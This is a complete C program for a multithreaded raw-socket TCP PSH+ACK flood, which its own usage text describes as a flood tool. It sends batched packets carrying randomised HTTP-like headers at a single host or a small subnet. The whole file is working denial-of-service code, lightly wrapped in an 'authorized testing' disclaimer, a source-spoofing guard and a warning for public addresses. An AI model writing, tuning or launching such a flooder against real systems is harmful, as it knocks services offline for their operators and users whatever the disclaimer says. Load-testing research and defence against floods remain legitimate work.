#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdatomic.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <sched.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/uio.h>
#include <ifaddrs.h>
#include <limits.h>

#define BATCH_MAX 1024
#define MAX_PKT   1500
#define MAX_THREADS 512

/* Number of elements in a true array (not a decayed pointer). */
#define ARRAY_LEN(a) (sizeof(a) / sizeof((a)[0]))

/* Constants for PRNG and math */
#define KNUTH_PRNG_MULTIPLIER 2654435761U
#define RANDOM_SEED_PRIME 31337U
#define SPORT_BASE 32768
#define SPORT_RANGE 28232
#define WIN_BASE 4096
#define WIN_RANGE 61440
#define IPID_PRIME 52429U
#define SEQ_PRIME 65521U
#define ACK_PRIME 524287U
#define PORT_PRIME 7919U
#define HOST_PRIME 1013U

/* Written only from the signal handler, read from workers/stats.
   sig_atomic_t is the correct type for signal-handler communication. */
static volatile sig_atomic_t running = 1;

typedef struct {
	_Atomic unsigned long long sent;
	_Atomic unsigned long long bytes;
	_Atomic unsigned long long errors;
	_Atomic unsigned int pps_cur;
	_Atomic unsigned long long bps_cur;
} stats_t;
static stats_t g_stats;

/* PRNG state is thread-local to avoid contention.
   _Thread_local is the C11 standard keyword (replaces the GCC-only __thread). */
static _Thread_local unsigned int prng_state;

static void seed_prng(unsigned int seed) {
	prng_state = seed * KNUTH_PRNG_MULTIPLIER + 1;
	if (prng_state == 0) prng_state = 1; /* xorshift must not start at 0 */
}

/* 32-bit Xorshift PRNG */
static inline unsigned int get_prng(void) {
	prng_state ^= prng_state << 13;
	prng_state ^= prng_state >> 17;
	prng_state ^= prng_state << 5;
	return prng_state;
}

/* Returns the first IPv4 address for a hostname in network byte order, or 0. */
static unsigned int resolve_host(const char *host) {
	struct addrinfo hints = { .ai_family = AF_INET, .ai_socktype = SOCK_STREAM };
	struct addrinfo *result;
	if (getaddrinfo(host, NULL, &hints, &result)) return 0;
	if (!result) return 0;
	unsigned int addr = ((struct sockaddr_in *)result->ai_addr)->sin_addr.s_addr;
	freeaddrinfo(result);
	return addr;
}

/* Returns the local IPv4 used to route to dst, in network byte order, or 0. */
static unsigned int get_local_source_ip(unsigned int dst) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) return 0;
	struct sockaddr_in sin = { .sin_family = AF_INET, .sin_addr.s_addr = dst, .sin_port = htons(80) };
	if (connect(fd, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
		close(fd);
		return 0;
	}
	struct sockaddr_in local;
	socklen_t addrlen = sizeof(local);
	if (getsockname(fd, (struct sockaddr *)&local, &addrlen) < 0) {
		close(fd);
		return 0;
	}
	close(fd);
	return local.sin_addr.s_addr;
}

/*
 * Verifies that addr is actually assigned to a local interface.
 *
 * This is a hard guarantee against source spoofing: every packet's source IP
 * must be one this host genuinely owns (via getifaddrs), so the tool can never
 * emit a forged source address. It only ever uses the real local egress IP.
 */
static int is_local_ip(unsigned int addr) {
	if (!addr) return 0;
	struct ifaddrs *ifap = NULL;
	if (getifaddrs(&ifap) != 0) return 0;
	int found = 0;
	for (struct ifaddrs *ifa = ifap; ifa; ifa = ifa->ifa_next) {
		if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET) continue;
		unsigned int a = ((struct sockaddr_in *)ifa->ifa_addr)->sin_addr.s_addr;
		if (a == addr) { found = 1; break; }
	}
	freeifaddrs(ifap);
	return found;
}

static void format_bandwidth(char *buf, size_t n, unsigned long long bps) {
	if (bps >= 1000000000ULL)
		snprintf(buf, n, "%.2f Gbps", (double)bps / 1e9);
	else if (bps >= 1000000ULL)
		snprintf(buf, n, "%.2f Mbps", (double)bps / 1e6);
	else
		snprintf(buf, n, "%.2f Kbps", (double)bps / 1e3);
}

/*
 * parse_int: Strict string->int conversion with full error detection.
 *
 * Replaces atoi(), which has undefined behavior on overflow and cannot
 * distinguish parse failure from a valid 0. This detects overflow/underflow
 * (ERANGE), empty strings, and trailing garbage, and clamps into int range.
 *
 * Returns 0 on success (*out set), -1 on any parse error.
 */
static int parse_int(const char *s, int *out) {
	if (!s || !*s) return -1;
	errno = 0;
	char *end = NULL;
	long v = strtol(s, &end, 10);
	if (end == s) return -1;            /* no digits consumed */
	if (*end != '\0') return -1;        /* trailing garbage */
	if (errno == ERANGE) {              /* out of long range: clamp */
		v = (v < 0) ? INT_MIN : INT_MAX;
	} else {                            /* in long range but maybe not int */
		if (v > (long)INT_MAX) v = INT_MAX;
		if (v < (long)INT_MIN) v = INT_MIN;
	}
	*out = (int)v;
	return 0;
}

static const char *user_agents[] = {
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2) AppleWebKit/605.1.15 Safari/605.1.15",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
	"curl/8.4.0","Wget/1.21.4","Python/3.11 aiohttp/3.9.1"
};
#define NUM_USER_AGENTS ((int)ARRAY_LEN(user_agents))

static const char *url_paths[] = {
	"/","/index.html","/search?q=test","/api/v2/users","/login",
	"/static/js/bundle.js","/assets/css/main.css","/favicon.ico",
	"/manifest.json","/service-worker.js","/api/status","/healthz",
	"/v1/data?limit=50","/stream?type=json","/oauth/token"
};
#define NUM_URL_PATHS ((int)ARRAY_LEN(url_paths))

#define NUM_PAYLOAD_TEMPLATES 64
static char payload_templates[NUM_PAYLOAD_TEMPLATES][1024];
static int payload_lengths[NUM_PAYLOAD_TEMPLATES];

/* Generates a variety of HTTP request headers. */
static void build_payload_templates(void) {
	static const char *languages[] = {
		"en-US,en;q=0.9","en-GB,en;q=0.8","fr-FR,fr;q=0.9,en;q=0.6","de-DE,de;q=0.9,en;q=0.5"
	};
	static const char *methods[] = { "GET", "HEAD", "OPTIONS", "GET", "POST", "GET" };

	unsigned int seed = (unsigned int)time(NULL);

	for (int i = 0; i < NUM_PAYLOAD_TEMPLATES; i++) {
		unsigned int h = (seed + (unsigned int)i) * KNUTH_PRNG_MULTIPLIER + (unsigned int)i * RANDOM_SEED_PRIME;
		h ^= h >> 16;
		int meth_idx = h % 6; h >>= 3;
		const char *method = methods[meth_idx];
		int path_idx = h % NUM_URL_PATHS; h >>= 4;
		int ua_idx = h % NUM_USER_AGENTS; h >>= 3;
		int lang_idx = h % 4; h >>= 2;
		unsigned int session_id = h + (unsigned int)i * 524287U;

		char referer[64] = "";
		if (h & 1) snprintf(referer, sizeof(referer), "Referer: http://t/%s\r\n", url_paths[(h >> 1) % NUM_URL_PATHS]);
		char cookie[48];
		snprintf(cookie, sizeof(cookie), "Cookie: session=%08x%08x\r\n", session_id, ~session_id);
		char dnt[16] = "";
		if (h & 2) snprintf(dnt, sizeof(dnt), "DNT: 1\r\n");

		int len;
		if (meth_idx == 4) { /* POST */
			len = snprintf(payload_templates[i], sizeof(payload_templates[i]),
				"POST %s HTTP/1.1\r\n"
				"Host: t\r\n"
				"User-Agent: %s\r\n"
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
				"Accept-Language: %s\r\n"
				"Accept-Encoding: gzip, deflate, br\r\n"
				"Connection: keep-alive\r\n"
				"%s%s%s"
				"Upgrade-Insecure-Requests: 1\r\n"
				"Sec-Fetch-Dest: document\r\n"
				"Sec-Fetch-Mode: navigate\r\n"
				"Sec-Fetch-Site: none\r\n"
				"Sec-Fetch-User: ?1\r\n"
				"Cache-Control: no-cache\r\n"
				"Content-Type: application/x-www-form-urlencoded\r\n"
				"Content-Length: 13\r\n"
				"\r\n"
				"key=value&a=1",
				url_paths[path_idx], user_agents[ua_idx], languages[lang_idx],
				cookie, referer, dnt);
		} else {
			len = snprintf(payload_templates[i], sizeof(payload_templates[i]),
				"%s %s HTTP/1.1\r\n"
				"Host: t\r\n"
				"User-Agent: %s\r\n"
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
				"Accept-Language: %s\r\n"
				"Accept-Encoding: gzip, deflate, br\r\n"
				"Connection: keep-alive\r\n"
				"%s%s%s"
				"Upgrade-Insecure-Requests: 1\r\n"
				"Sec-Fetch-Dest: document\r\n"
				"Sec-Fetch-Mode: navigate\r\n"
				"Sec-Fetch-Site: none\r\n"
				"Sec-Fetch-User: ?1\r\n"
				"Cache-Control: no-cache\r\n\r\n",
				method, url_paths[path_idx], user_agents[ua_idx], languages[lang_idx],
				cookie, referer, dnt);
		}
		if (len < 0) len = 0;
		if (len >= (int)sizeof(payload_templates[i])) len = (int)sizeof(payload_templates[i]) - 1;
		payload_lengths[i] = len;
	}
}

/*
 * Builds a base packet template and computes the initial TCP-segment checksum
 * over the fixed parts (options + payload). Per-packet fields (IP addresses,
 * ports, seq, ack, win, timestamps) are left at 0 in the template and their
 * contributions are added later in patch_packet().
 *
 * The template checksum treats the TCP segment as a sequence of 16-bit
 * big-endian words (Internet checksum). An odd trailing byte is padded with a
 * zero low byte, contributing (byte << 8).
 */
static int build_packet_template(char *buf, int max_pkt_sz, const char *payload, int payload_len,
	int extra_pay_len, unsigned long *out_template_csum)
{
	int options_len = 12;
	int tcp_header_len = 20 + options_len;
	int data_offset = tcp_header_len / 4;
	if (data_offset > 15) data_offset = 15;

	int total_payload_len = payload_len + extra_pay_len;
	int total_tcp_len = tcp_header_len + total_payload_len;
	int pkt_len = 20 + total_tcp_len;
	if (pkt_len > max_pkt_sz) pkt_len = max_pkt_sz;

	memset(buf, 0, (size_t)pkt_len);

	struct iphdr *ip = (struct iphdr *)buf;
	ip->version  = 4;
	ip->ihl      = 5;
	ip->tot_len  = htons((unsigned short)pkt_len);
	ip->frag_off = htons(0x4000); /* DF set */
	ip->ttl      = 64;
	ip->protocol = IPPROTO_TCP;
	/* id, saddr, daddr, check patched per packet; left 0 here */

	unsigned char *tcp = (unsigned char *)(buf + 20);
	tcp[12] = (unsigned char)(data_offset << 4);
	tcp[13] = 0x18; /* PSH+ACK */
	/* NOP + NOP + TS option kind/len */
	tcp[20] = 1; tcp[21] = 1;
	tcp[22] = 8; tcp[23] = 10;

	int data_start_off = 20 + tcp_header_len;
	int copy_len = payload_len;
	if (copy_len > pkt_len - data_start_off) copy_len = pkt_len - data_start_off;
	if (copy_len > 0) memcpy(buf + data_start_off, payload, (size_t)copy_len);

	if (extra_pay_len > 0 && data_start_off + copy_len + extra_pay_len <= pkt_len) {
		unsigned char *extra_ptr = (unsigned char *)(buf + data_start_off + copy_len);
		for (int j = 0; j < extra_pay_len; j++)
			extra_ptr[j] = (unsigned char)((unsigned int)j * RANDOM_SEED_PRIME);
	}

	/* Sum the whole TCP segment as big-endian words. Per-packet fields are 0,
	   so this is exactly the fixed-parts checksum. */
	int seg_len = pkt_len - 20;
	unsigned long checksum = 0;
	const unsigned char *t = (unsigned char *)tcp;
	for (int i = 0; i + 1 < seg_len; i += 2)
		checksum += (unsigned long)((t[i] << 8) | t[i + 1]);
	if (seg_len & 1)
		checksum += (unsigned long)(t[seg_len - 1] << 8);

	*out_template_csum = checksum;
	return pkt_len;
}

static inline unsigned long csum_fold(unsigned long c) {
	while (c >> 16) c = (c & 0xFFFFUL) + (c >> 16);
	return c;
}

/*
 * Patches per-packet fields and updates checksums.
 *
 * All seq/ack/ts_val/ts_ecr/sport/dport/win are passed in HOST byte order.
 * ipid is host order. src/dst are network-order IPv4 addresses (s_addr).
 *
 * TCP checksum = template_csum (fixed parts, per-packet fields were 0)
 *              + contributions of the now-written per-packet fields
 *              + pseudo-header (src, dst, proto, tcp_len).
 */
static void patch_packet(char *buf, int pkt_len,
	unsigned int src, unsigned int dst,
	unsigned int seq, unsigned int ack,
	unsigned short sport, unsigned short dport,
	unsigned short win, unsigned short ipid,
	unsigned int ts_val, unsigned int ts_ecr,
	unsigned long template_csum)
{
	struct iphdr *ip = (struct iphdr *)buf;
	ip->id    = htons(ipid);
	ip->saddr = src;
	ip->daddr = dst;

	/* IP header checksum over 20 bytes as 10 big-endian words, check field = 0 */
	ip->check = 0;
	unsigned long ip_cs = 0;
	const unsigned char *ih = (const unsigned char *)ip;
	for (int i = 0; i < 20; i += 2)
		ip_cs += (unsigned long)((ih[i] << 8) | ih[i + 1]);
	ip->check = htons((unsigned short)(~csum_fold(ip_cs)));

	unsigned char *tcp = (unsigned char *)(buf + 20);
	int tcp_len = pkt_len - 20;

	/* Write per-packet TCP fields in network byte order (via htonl/htons + memcpy
	   to avoid alignment/aliasing UB). */
	uint16_t n_sport = htons(sport), n_dport = htons(dport), n_win = htons(win);
	uint32_t n_seq = htonl(seq), n_ack = htonl(ack), n_tsval = htonl(ts_val), n_tsecr = htonl(ts_ecr);
	memcpy(tcp + 0, &n_sport, 2);
	memcpy(tcp + 2, &n_dport, 2);
	memcpy(tcp + 4, &n_seq, 4);
	memcpy(tcp + 8, &n_ack, 4);
	memcpy(tcp + 14, &n_win, 2);
	memcpy(tcp + 24, &n_tsval, 4);
	memcpy(tcp + 28, &n_tsecr, 4);

	/* TCP checksum. Add each per-packet field as its big-endian 16-bit words.
	   For a host-order value V, the network-order words are (V>>16, V&0xFFFF). */
	unsigned long csum = template_csum;
	csum += (unsigned long)sport + (unsigned long)dport;
	csum += (unsigned long)(seq >> 16) + (unsigned long)(seq & 0xFFFF);
	csum += (unsigned long)(ack >> 16) + (unsigned long)(ack & 0xFFFF);
	csum += (unsigned long)win;
	csum += (unsigned long)(ts_val >> 16) + (unsigned long)(ts_val & 0xFFFF);
	csum += (unsigned long)(ts_ecr >> 16) + (unsigned long)(ts_ecr & 0xFFFF);

	/* Pseudo-header. src/dst are network-order s_addr; convert to host order
	   before splitting into big-endian 16-bit words. */
	unsigned int hsrc = ntohl(src), hdst = ntohl(dst);
	csum += (unsigned long)(hsrc >> 16) + (unsigned long)(hsrc & 0xFFFF);
	csum += (unsigned long)(hdst >> 16) + (unsigned long)(hdst & 0xFFFF);
	csum += (unsigned long)IPPROTO_TCP;               /* pseudo-header protocol word = 0x0006 */
	csum += (unsigned long)tcp_len;                   /* pseudo-header length word */

	unsigned short csc = (unsigned short)(~csum_fold(csum));
	tcp[16] = (unsigned char)(csc >> 8);              /* write big-endian, endian-independent */
	tcp[17] = (unsigned char)(csc & 0xFF);
}

struct worker_config {
	unsigned int src_ip, dst_base;
	int num_hosts, dst_port, duration, pay_len, pkt_sz, tid, num_templates;
	int *template_lengths; char (*templates)[MAX_PKT];
	unsigned long *template_csums;
};

static void *worker_thread(void *arg) {
	struct worker_config *cfg = (struct worker_config *)arg;

	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(cfg->tid, &cpuset);
	/* Non-fatal: running unpinned is fine. */
	pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);

	seed_prng((unsigned int)(unsigned long)pthread_self() ^ (unsigned int)time(NULL) ^ (unsigned int)cfg->tid);

	size_t pool_size = (size_t)MAX_PKT * BATCH_MAX
		+ sizeof(struct sockaddr_in) * BATCH_MAX
		+ sizeof(struct iovec) * BATCH_MAX
		+ sizeof(struct mmsghdr) * BATCH_MAX;
	char *memory_pool = malloc(pool_size);
	if (!memory_pool) {
		/* Report errno numerically: strerror() may use shared static storage and
		   is not thread-safe; strerror_r() has incompatible GNU/POSIX variants.
		   This path (OOM) is rare, so a numeric code is sufficient. */
		int saved_errno = errno;
		fprintf(stderr, "worker %d: malloc failed (errno=%d)\n", cfg->tid, saved_errno);
		return NULL;
	}

	char *packet_buffer = memory_pool;
	struct sockaddr_in *target_addrs = (struct sockaddr_in *)(packet_buffer + (size_t)MAX_PKT * BATCH_MAX);
	struct iovec *io_vectors = (struct iovec *)(target_addrs + BATCH_MAX);
	struct mmsghdr *messages = (struct mmsghdr *)(io_vectors + BATCH_MAX);

	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sock < 0) {
		int e = errno;
		fprintf(stderr, "worker %d: socket failed (errno=%d)\n", cfg->tid, e);
		free(memory_pool);
		return NULL;
	}
	int one = 1;
	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
		int e = errno;
		fprintf(stderr, "worker %d: setsockopt IP_HDRINCL failed (errno=%d)\n", cfg->tid, e);
	}
	int sndbuf_size = 32 * 1024 * 1024;
	if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf_size, sizeof(sndbuf_size)) < 0) {
		int e = errno;
		fprintf(stderr, "worker %d: setsockopt SO_SNDBUF failed (errno=%d)\n", cfg->tid, e);
	}

	/* Precompute per-port network-order destination port once. */
	uint16_t n_dport = htons((unsigned short)cfg->dst_port);
	unsigned short host_dport = (unsigned short)cfg->dst_port;

	for (unsigned int n = 0; n < BATCH_MAX; n++) {
		target_addrs[n].sin_family = AF_INET;
		target_addrs[n].sin_port   = n_dport;
		messages[n].msg_hdr.msg_name    = &target_addrs[n];
		messages[n].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
		messages[n].msg_hdr.msg_iov     = &io_vectors[n];
		messages[n].msg_hdr.msg_iovlen  = 1;
	}

	struct timespec ts_start, now;
	clock_gettime(CLOCK_MONOTONIC, &ts_start);
	long long deadline = cfg->duration > 0 ? (long long)cfg->duration : -1;

	while (running) {
		if (deadline >= 0) {
			clock_gettime(CLOCK_MONOTONIC, &now);
			long long elapsed = (long long)(now.tv_sec - ts_start.tv_sec);
			if (elapsed >= deadline) break;
		}

		unsigned int r0 = get_prng(), r1 = get_prng(), r2 = get_prng();

		for (unsigned int n = 0; n < BATCH_MAX; n++) {
			unsigned int dst = cfg->dst_base
				+ ((r0 + n * HOST_PRIME) % (unsigned int)cfg->num_hosts);
			unsigned short sport = (unsigned short)(SPORT_BASE + ((r1 + n * PORT_PRIME) % SPORT_RANGE));
			unsigned int seq = r0 + n * SEQ_PRIME;      /* host order */
			unsigned int ack = r1 + n * ACK_PRIME;      /* host order */
			unsigned short win = (unsigned short)(WIN_BASE + ((r0 + n * 12347U) % WIN_RANGE));
			unsigned short ipid = (unsigned short)(r0 + n * IPID_PRIME + (r2 >> 16));
			unsigned int ts_val = r1 + n * 1000U + (r2 & 0xFFF);          /* host order */
			unsigned int ts_ecr = (r1 > 50000U ? r1 - 50000U : 0U) + n * 7U; /* host order */
			int template_idx = (int)((r2 + n * 1543U) % (unsigned int)cfg->num_templates);

			char *pkt = packet_buffer + n * MAX_PKT;
			int pkt_len = cfg->template_lengths[template_idx];
			memcpy(pkt, cfg->templates[template_idx], (size_t)pkt_len);

			patch_packet(pkt, pkt_len,
				cfg->src_ip, dst, seq, ack,
				sport, host_dport, win, ipid,
				ts_val, ts_ecr,
				cfg->template_csums[template_idx]);

			target_addrs[n].sin_addr.s_addr = dst;
			io_vectors[n].iov_base = pkt;
			io_vectors[n].iov_len  = (size_t)pkt_len;
		}

		int ret = sendmmsg(sock, messages, BATCH_MAX, 0);
		if (ret > 0) {
			unsigned long total_bytes = 0;
			for (int n = 0; n < ret; n++)
				total_bytes += (unsigned long)io_vectors[n].iov_len;
			atomic_fetch_add_explicit(&g_stats.sent, (unsigned long long)ret, memory_order_relaxed);
			atomic_fetch_add_explicit(&g_stats.bytes, total_bytes, memory_order_relaxed);
		} else if (ret < 0) {
			atomic_fetch_add_explicit(&g_stats.errors, 1ULL, memory_order_relaxed);
		}
	}

	close(sock);
	free(memory_pool);
	return NULL;
}

static void *stats_thread(void *arg) {
	(void)arg;
	unsigned long long last_pkt = 0, last_byte = 0;
	while (running) {
		struct timespec ts = { .tv_sec = 2, .tv_nsec = 0 };
		nanosleep(&ts, NULL);
		unsigned long long cur_pkt = atomic_load_explicit(&g_stats.sent, memory_order_relaxed);
		unsigned long long cur_byte = atomic_load_explicit(&g_stats.bytes, memory_order_relaxed);

		unsigned int pps = (unsigned int)((cur_pkt - last_pkt) / 2);
		unsigned long long bps = (cur_byte - last_byte) * 8 / 2;

		atomic_store_explicit(&g_stats.pps_cur, pps, memory_order_relaxed);
		atomic_store_explicit(&g_stats.bps_cur, bps, memory_order_relaxed);

		last_pkt = cur_pkt;
		last_byte = cur_byte;

		char bw_str[16];
		format_bandwidth(bw_str, sizeof(bw_str), bps);
		unsigned long long errs = atomic_load_explicit(&g_stats.errors, memory_order_relaxed);
		printf("\r  %u pps  %s  |  %llu err  ", pps, bw_str, errs);
		fflush(stdout);
	}
	printf("\n");
	return NULL;
}

static void handle_signal(int sig) { (void)sig; running = 0; }

static void print_usage(const char *name) {
	fprintf(stderr,
		"Usage: %s <target> <port> <time> [-t threads] [-l len]\n"
		"\n"
		"SOCK_RAW PSH+ACK flood, delta checksum engine.\n"
		"Per-thread config, CPU pinned, sendmmsg batching.\n"
		"\n"
		"  target   IP or CIDR /24-/28\n"
		"  port     TCP port\n"
		"  time     duration in seconds (0 = until Ctrl+C)\n"
		"  -t N     threads (default 4, max %d)\n"
		"  -l N     extra payload bytes 0-1400 (default 0)\n"
		"\n"
		"For authorized testing of systems you own or have permission to test.\n"
		, name, MAX_THREADS);
}

int main(int argc, char **argv) {
	int num_threads = 4, extra_pay_len = 0, opt;

	while ((opt = getopt(argc, argv, "t:l:h")) != -1) {
		switch (opt) {
		case 't':
			if (parse_int(optarg, &num_threads) != 0) { fprintf(stderr, "bad -t value\n"); return 1; }
			break;
		case 'l':
			if (parse_int(optarg, &extra_pay_len) != 0) { fprintf(stderr, "bad -l value\n"); return 1; }
			break;
		case 'h': default: print_usage(argv[0]); return opt == 'h' ? 0 : 1;
		}
	}
	if (optind + 3 > argc) { print_usage(argv[0]); return 1; }
	const char *target = argv[optind];
	int port, duration;
	if (parse_int(argv[optind + 1], &port) != 0) { fprintf(stderr, "bad port\n"); return 1; }
	if (parse_int(argv[optind + 2], &duration) != 0) { fprintf(stderr, "bad time\n"); return 1; }
	if (port < 1 || port > 65535) { fprintf(stderr, "bad port\n"); return 1; }
	if (duration < 0) duration = 0;
	if (num_threads < 1) { fprintf(stderr, "thread count must be >= 1\n"); return 1; }
	if (num_threads > MAX_THREADS) {
		fprintf(stderr, "capping threads from %d to %d\n", num_threads, MAX_THREADS);
		num_threads = MAX_THREADS;
	}
	if (extra_pay_len < 0) extra_pay_len = 0;
	if (extra_pay_len > 1400) extra_pay_len = 1400;
	if (geteuid() != 0) { fprintf(stderr, "root required (SOCK_RAW)\n"); return 1; }

	build_payload_templates();

	unsigned int dst_base, dst_ip_for_src;
	int prefix, num_hosts;
	char subnet_info[64] = "";
	char *slash = strchr(target, '/');

	if (slash) {
		char ip_str[32];
		int ln = (int)(slash - target);
		if (ln == 0 || ln >= (int)sizeof(ip_str)) { fprintf(stderr, "bad cidr\n"); return 1; }
		memcpy(ip_str, target, (size_t)ln); ip_str[ln] = 0;
		if (inet_pton(AF_INET, ip_str, &dst_base) != 1) { fprintf(stderr, "bad ip\n"); return 1; }
		if (parse_int(slash + 1, &prefix) != 0) { fprintf(stderr, "bad cidr prefix\n"); return 1; }
		if (prefix < 24 || prefix > 28) { fprintf(stderr, "use /24-/28\n"); return 1; }
		num_hosts = 1 << (32 - prefix);
		unsigned int h = ntohl(dst_base);
		if (prefix >= 28) h &= 0xFFFFFFF0;
		else if (prefix >= 27) h &= 0xFFFFFFE0;
		else if (prefix >= 26) h &= 0xFFFFFFC0;
		else if (prefix >= 25) h &= 0xFFFFFF80;
		else h &= 0xFFFFFF00;
		dst_base = htonl(h);
		dst_ip_for_src = dst_base;
		snprintf(subnet_info, sizeof(subnet_info), "%d IPs (/%d)", num_hosts, prefix);
	} else {
		dst_ip_for_src = resolve_host(target);
		if (!dst_ip_for_src) { fprintf(stderr, "cannot resolve %s\n", target); return 1; }
		dst_base = dst_ip_for_src;
		num_hosts = 1;
	}

	unsigned int src_ip = get_local_source_ip(dst_ip_for_src);
	if (!src_ip) { fprintf(stderr, "cannot determine source IP\n"); return 1; }

	/* Hard guarantee against spoofing: the source must be a real local address. */
	if (!is_local_ip(src_ip)) {
		char s[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &src_ip, s, sizeof(s));
		fprintf(stderr, "refusing: source IP %s is not a local interface address (spoof guard)\n", s);
		return 1;
	}

	/* Use inet_ntop with separate buffers (inet_ntoa uses one static buffer and
	   is not safe to call twice in one printf). */
	char dst_str[INET_ADDRSTRLEN], src_str[INET_ADDRSTRLEN];
	if (!inet_ntop(AF_INET, &dst_ip_for_src, dst_str, sizeof(dst_str))) strcpy(dst_str, "?");
	if (!inet_ntop(AF_INET, &src_ip, src_str, sizeof(src_str))) strcpy(src_str, "?");

	/* Safety note for public targets. Compute the first two octets once (host
	   order) and check against private/reserved ranges. */
	uint32_t dst_host = ntohl(dst_ip_for_src);
	unsigned char o1 = (unsigned char)(dst_host >> 24);
	unsigned char o2 = (unsigned char)((dst_host >> 16) & 0xFF);
	int is_private = (o1 == 10 || o1 == 127
	                  || (o1 == 192 && o2 == 168)
	                  || (o1 == 172 && (o2 & 0xF0) == 16)
	                  || (o1 == 169 && o2 == 254));
	if (!is_private) {
		fprintf(stderr,
			"WARNING: target %s is not a private/reserved address.\n"
			"Only run this against hosts you own or have explicit permission to test.\n\n",
			dst_str);
	}

	struct sigaction sa;
	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = handle_signal;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0; /* no SA_RESTART: let blocking calls return so threads exit promptly */
	sigaction(SIGINT, &sa, NULL);
	sigaction(SIGTERM, &sa, NULL);

	int max_payload_len = payload_lengths[0];
	for (int i = 1; i < NUM_PAYLOAD_TEMPLATES; i++)
		if (payload_lengths[i] > max_payload_len) max_payload_len = payload_lengths[i];

	int pkt_sz = 20 + 32 + max_payload_len + extra_pay_len;
	if (pkt_sz > MAX_PKT) pkt_sz = MAX_PKT;
	if (pkt_sz < 64) pkt_sz = 64;

	static char packet_templates[NUM_PAYLOAD_TEMPLATES][MAX_PKT];
	static int template_lengths[NUM_PAYLOAD_TEMPLATES];
	static unsigned long template_csums[NUM_PAYLOAD_TEMPLATES];
	for (int i = 0; i < NUM_PAYLOAD_TEMPLATES; i++) {
		template_lengths[i] = build_packet_template(packet_templates[i], pkt_sz,
			payload_templates[i], payload_lengths[i], extra_pay_len, &template_csums[i]);
	}

	printf(
		"  Target:   %s:%d\n"
		"  Subnet:   %s\n"
		"  Source:   %s\n"
		"  Threads:  %d\n"
		"  Duration: %ds\n"
		"  Payload:  %d B extra  (pkt ~%d B)\n"
		"  Batch:    %d  |  Csum: delta (fixed parts cached)\n"
		"  Buffer:   32MB sndbuf  |  I/O: sendmmsg\n"
		"  Type:     SOCK_RAW, pre-built templates, CPU pinned\n"
		"  Press Ctrl+C to stop\n\n",
		dst_str, port, subnet_info[0] ? subnet_info : "single host",
		src_str, num_threads,
		duration, extra_pay_len, pkt_sz,
		BATCH_MAX);

	struct worker_config *configs = malloc(sizeof(struct worker_config) * (size_t)num_threads);
	if (!configs) { fprintf(stderr, "malloc configs failed\n"); return 1; }

	long cores = sysconf(_SC_NPROCESSORS_ONLN);
	int num_cores = (cores > 0) ? (int)cores : 1;

	for (int i = 0; i < num_threads; i++) {
		configs[i] = (struct worker_config){
			src_ip, dst_base, num_hosts, port, duration,
			extra_pay_len, pkt_sz, i % num_cores, NUM_PAYLOAD_TEMPLATES,
			template_lengths, packet_templates, template_csums
		};
	}

	pthread_t stats_tid;
	{
		int rc = pthread_create(&stats_tid, NULL, stats_thread, NULL);
		if (rc != 0) {
			fprintf(stderr, "pthread_create stats failed (rc=%d)\n", rc);
			free(configs);
			return 1;
		}
	}

	pthread_t *worker_tids = malloc(sizeof(pthread_t) * (size_t)num_threads);
	if (!worker_tids) {
		fprintf(stderr, "malloc worker_tids failed\n");
		running = 0;
		pthread_join(stats_tid, NULL);
		free(configs);
		return 1;
	}

	int created = 0;
	for (int i = 0; i < num_threads; i++) {
		/* pthread_create returns the error code directly (does not set errno). */
		int rc = pthread_create(&worker_tids[i], NULL, worker_thread, &configs[i]);
		if (rc != 0) {
			fprintf(stderr, "pthread_create worker %d failed (rc=%d)\n", i, rc);
			break;
		}
		created++;
	}
	if (created == 0) {
		fprintf(stderr, "no worker threads started\n");
		running = 0;
		pthread_join(stats_tid, NULL);
		free(worker_tids);
		free(configs);
		return 1;
	}

	for (int i = 0; i < created; i++)
		pthread_join(worker_tids[i], NULL);

	running = 0;
	pthread_join(stats_tid, NULL);
	free(worker_tids);
	free(configs);

	printf("  Final: %llu pkts, %llu bytes, %llu errors\n",
	       atomic_load_explicit(&g_stats.sent, memory_order_relaxed),
	       atomic_load_explicit(&g_stats.bytes, memory_order_relaxed),
	       atomic_load_explicit(&g_stats.errors, memory_order_relaxed));
	return 0;
}
